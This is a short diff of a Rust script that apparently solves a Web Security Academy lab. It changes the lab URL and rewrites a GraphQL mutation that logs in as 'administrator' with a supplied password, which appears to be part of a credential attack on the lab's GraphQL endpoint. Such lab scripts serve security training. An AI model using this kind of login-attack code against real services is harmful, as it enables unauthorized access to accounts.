@@ -23,7 +23,7 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a0300af038238b880ddb22300c200a0.web-security-academy.net";
+const LAB_URL: &str = "https://0a35001003377886895ab00700f50080.web-security-academy.net";
 
 lazy_static! {
     static ref WEB_CLIENT: Client = build_web_client();
@@ -100,18 +100,16 @@ fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
 }
 
 fn login_as_admin(admin_password: &str) -> Response {
-    let mutation = r###"mutation login($input: LoginInput!) {
-                                login(input: $input) {
-                                    token
-                                    success
-                                }
-                        }"###;
-    let variables = format!(
-        r###"{{ "input": {{ "username": "administrator", "password": "{admin_password}" }} }}"###
+    let mutation = format!(
+        r###"mutation login {{
+                login(input: {{ username: \"administrator\", password: \"{admin_password}\" }}) {{
+                    token
+                    success
+                }}
+            }}"###
     );
-    let body_json = format!(
-        r###"{{ "query": "{mutation}", "operationName": "login", "variables": {variables} }}"###
-    );
+    let body_json = format!(r###"{{ "query": "{mutation}", "operationName": "login" }}"###);
+
     WEB_CLIENT
         .post(format!("{LAB_URL}/graphql/v1"))
         .header("Content-Type", "application/json")
